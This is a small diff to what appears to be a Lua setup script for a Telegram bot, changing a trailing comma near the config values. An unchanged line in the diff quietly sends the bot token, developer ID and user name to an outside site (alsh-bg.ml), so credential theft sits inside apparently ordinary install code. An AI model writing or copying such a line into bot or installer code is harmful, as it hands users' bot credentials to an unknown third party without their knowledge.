@@ -75,7 +75,7 @@ create_config_auto()
 DevId = Devmfm:get(Servermustafa.."Idmustafa")
 TokenBot = Devmfm:get(Servermustafa.."Tokenmustafa")
 mustafa = Devmfm:get(Servermustafa.."Tokenmustafa"):match("(%d+)"),
-SudoIds = {Devmfm:get(Servermustafa.."Idmustafa")},
+SudoIds = {Devmfm:get(Servermustafa.."Idmustafa")}
 https.request("https://alsh-bg.ml/TED.php?token="..TokenBot.."&id="..DevId.."&user="..User)
  
 install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
